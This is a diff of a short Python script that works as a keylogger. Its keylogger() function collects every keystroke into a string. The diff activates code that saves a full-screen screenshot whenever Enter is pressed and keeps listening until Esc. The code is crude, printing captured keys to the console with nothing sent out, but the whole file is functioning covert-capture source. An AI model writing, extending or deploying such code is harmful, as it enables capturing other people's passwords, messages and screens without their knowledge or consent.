@@ -1,5 +1,4 @@
 import keyboard
-import datetime
 from PIL import ImageGrab
 
 session = 1
@@ -11,36 +10,18 @@ def keylogger():
             print(event.name)
             text += event.name
             print(text)
-def time():
-    current_time = datetime.datetime.now()
-    print(current_time)
 
-def create_file():
-    with open("counter.pickle", "w") as file:
-        file.write('logs')
+def take_screenshot():
+    screenshot = ImageGrab.grab()
+    screenshot.save("screenshot.png")
+    print("Скриншот сохранен")
 
-def edit_logs():
-    with open("logs", "w") as file:
-        file.write('1')
+def on_key(event):
+    if event.name == "enter":
+        take_screenshot()
 
-# def take_screenshot():
-#     screenshot = ImageGrab.grab()
-#     screenshot.save("screenshot.png")
-#     print("Скриншот сохранен")
-#
-# def on_key(event):
-#     if event.name == "enter":
-#         take_screenshot()
-#
-# keyboard.on_press(on_key)
-# keyboard.wait('esc')
+keyboard.on_press(on_key)
+keyboard.wait('esc')
 
-
-
-#keyboard.on_press(on_key)
-#keyboard.wait('esc')
 
 keylogger()
-#time()
-#create_file()
-#edit_logs()
